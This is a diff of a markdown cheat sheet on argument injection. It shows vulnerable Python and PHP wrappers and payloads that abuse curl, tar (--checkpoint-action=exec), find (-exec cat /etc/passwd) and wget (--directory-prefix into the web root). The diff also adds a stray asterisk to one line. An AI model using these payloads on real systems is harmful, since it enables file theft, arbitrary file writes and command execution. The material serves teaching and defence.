@@ -1,4 +1,5 @@
 # Argument Injection
+
 Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.
 
 It can happen in different situations, where you can only inject arguments to a command:
@@ -7,7 +8,8 @@ It can happen in different situations, where you can only inject arguments to a 
 - Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen)
 - Bash expansion (ex: *)
 
-In the following example, a python script takes the inputs from the command line to generate a ```curl``` command:
+In the following example, a python script takes the inputs from the command line to generate a ```curl``` command:*
+
 ```py
 from shlex import quote,split
 import sys
@@ -19,14 +21,19 @@ if __name__=="__main__":
     print(command)
     r = subprocess.Popen(command)
 ```
+
 It is possible for an attacker to pass several words to abuse options from ```curl``` command
+
 ```ps1
 python python_rce.py "https://www.google.fr -o test.py" 
 ```
-We can see by printing the command that all the parameters are splited allowing to inject an argument that will save the response in an arbitrary file.
+
+We can see by printing the command that all the parameters are split allowing to inject an argument that will save the response in an arbitrary file.
+
 ```ps1
 ['curl', 'https://www.google.fr', '-o', 'test.py']
 ```
+
 ## Summary
 
 * [List of exposed commands](#list-of-exposed-commands)
@@ -40,6 +47,7 @@ We can see by printing the command that all the parameters are splited allowing 
 ## List of exposed commands
 
 ### CURL
+
 It is possible to abuse ```curl``` through the following options:
 
 ```ps1
@@ -49,9 +57,11 @@ It is possible to abuse ```curl``` through the following options:
 In case there is already one option in the command it is possible to inject several URLs to download and several output options. Each option will affect each URL in sequence.
 
 ### TAR
+
 For the ```tar``` command it is possible to inject arbitrary arguments in different commands. 
 
 Argument injection can happen into the '''extract''' command:
+
 ```ps1
 --to-command <command>
 --checkpoint=1 --checkpoint-action=exec=<command>
@@ -59,35 +69,45 @@ Argument injection can happen into the '''extract''' command:
 ```
 
 Or in the '''create''' command:
+
 ```ps1
 -I=<program> or -I <program>
 --use-compres-program=<program>
 ```
+
 There are also short options to work without spaces:
+
 ```ps1
 -T<file>
 -I"/path/to/exec"
 ```
 
 ### FIND
+
 Find some_file inside /tmp directory.
+
 ```php
 $file = "some_file";
 system("find /tmp -iname ".escapeshellcmd($file));
 ```
 
 Print /etc/passwd content.
+
 ```php
 $file = "sth -or -exec cat /etc/passwd ; -quit";
 system("find /tmp -iname ".escapeshellcmd($file));
 ```
 
 ### WGET
+
 Example of vulnerable code
+
 ```php
 system(escapeshellcmd('wget '.$url));
 ```
+
 Arbitrary file write
+
 ```php
 $url = '--directory-prefix=/var/www/html http://example.com/example.php';
 ```
